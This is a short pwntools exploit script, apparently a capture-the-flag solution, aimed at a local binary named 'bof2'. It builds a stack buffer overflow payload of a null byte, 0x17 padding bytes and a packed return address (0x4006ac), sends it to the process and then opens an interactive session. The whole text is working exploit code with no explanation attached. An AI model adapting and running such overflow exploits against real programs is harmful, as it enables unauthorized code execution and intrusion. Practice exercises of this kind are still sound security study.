from pwn import *
r = process('./bof2')
r.recvline()

p = '\0' + 'a' * 0x17 + p64(0x4006ac)
print(len(p))
r.send(p)
r.interactive()
